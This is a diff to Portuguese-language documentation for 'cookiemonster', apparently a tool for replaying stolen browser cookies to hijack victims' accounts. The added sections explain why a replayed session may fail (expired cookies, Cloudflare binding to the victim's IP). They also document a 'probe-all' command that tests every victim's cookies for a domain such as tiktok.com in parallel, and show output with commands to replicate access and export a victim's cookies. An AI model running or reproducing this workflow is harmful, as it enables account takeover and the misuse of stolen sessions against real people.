@@ -668,9 +668,16 @@ Recrie o `store.db` com `python -m cookiemonster ingest --resume` (deleta + re-i
 
 O `util/psl.py` baixa a PSL com cache local. Se a rede estiver bloqueada, o fallback hardcoded é usado. Para forçar refresh: delete `%USERPROFILE%\.cache\cookiemonster\public_suffix_list.dat`.
 
-### `cookies.json` JSON dentro de arquivos `.txt`
+### `access` abre o navegador mas aparece tela de login
 
-A ferramenta detecta automaticamente o conteúdo JSON mesmo em arquivos com extensão `.txt`. Você verá `json files: N` no relatório de ingest.
+A ferramenta nao consegue distinguir o motivo exato (servidor vs. fingerprint), mas geralmente significa:
+
+1. **Cookies expirados/invalidados** — a vitima ja nao esta logada. Tente outra vitima (rode `probe-all` para encontrar uma CONFIRMED).
+2. **Cloudflare/anti-bot** — o `cf_clearance` da vitima so vale para o IP dela. Em outro IP, Cloudflare pede desafio.
+3. **Sessao revogada** — a vitima pode ter saido da conta em outro dispositivo.
+4. **Probe deu LIKELY mas o site pediu login** — LIKELY significa que a UI parece autenticada, mas sem identidade explicita. Nem sempre o servidor honrara os cookies.
+
+Dica: rode `python -m cookiemonster probe-all --domain X --allow-unsafe-scope` antes de tentar `access`, para encontrar vitimas com `state=CONFIRMED`. Esses sao os casos onde o servidor reconheceu a sessao de fato.
 
 ---
 
@@ -826,6 +833,60 @@ python -m cookiemonster dashboard [OPTIONS]
 ```
 
 Mostra um resumo amigavel de todos os runs: contagem por estado (CONFIRMED/LIKELY/ANONYMOUS/UNKNOWN), ultimos N runs, e destaque dos alvos com acesso confirmado (com comando para replicar).
+
+### 8.15 `probe-all` (varrer todas as vitimas)
+
+```
+python -m cookiemonster probe-all [OPTIONS]
+
+  --db PATH
+  --domain TEXT                 [obrigatorio]
+  --limit INTEGER               [default: 0 (todas)]
+  --channel [playwright|httpx]  [default: playwright]
+  --workers INTEGER             [default: 3]
+  --max-wait-ms INTEGER         [default: 6000]
+  --replay-mode [...]           [default: strict]
+  --allow-unsafe-scope
+```
+
+Executa o pipeline `best + cookies + inject + check` em **TODAS as vitimas candidatas do dominio**, em paralelo, com progresso em tempo real.
+
+Quando usar:
+- **Triagem rapida**: `--channel httpx` (~1s por vitima, ideal para 100+ vitimas).
+- **Validacao forte**: `--channel playwright` (replica sessao real, ~5-15s por vitima).
+- Use `--limit N` para testar apenas o top N (mais rapido).
+- Use `--workers` para paralelizar (Playwright: max 4 recomendado).
+
+Exemplo de saida:
+
+```
+=== CookieMonster: probe-all tiktok.com ===
+  Total de vitimas candidatas: 3
+  Canal: playwright  Workers: 3  Replay-mode: strict
+  (inicando paralelo, isso pode levar minutos...)
+
+[1/3]    10s (eta   20s) vid= 2197 state=UNKNOWN   auth=9
+[2/3]    10s (eta    5s) vid= 2793 state=UNKNOWN   auth=10
+[3/3]    17s (eta    0s) vid= 2390 state=CONFIRMED auth=11
+
+Resumo (17s, 3 vitimas)
+  CONFIRMED (acesso confirmado): 1
+  UNKNOWN   (indeterminado):     2
+
+Detalhes (top 30)
+    VID      STATE   CONF  AUTH  TOTAL  FINAL_URL
+   2390  CONFIRMED   0.90    11    378  https://www.tiktok.com/
+   2197    UNKNOWN   0.30     9    188  https://www.tiktok.com/
+   2793    UNKNOWN   0.30    10    109  https://www.tiktok.com/
+
+>>> Alvos com acesso (CONFIRMED/LIKELY):
+  - tiktok.com vitima=2390 state=CONFIRMED conf=0.90
+
+  Replicar acesso:
+    python -m cookiemonster access --domain tiktok.com --victim 2390 --allow-unsafe-scope
+  Exportar cookies:
+    python -m cookiemonster export-cookies --domain tiktok.com --victim 2390 -o tiktok.com_cookies.txt
+```
 
 ---
 
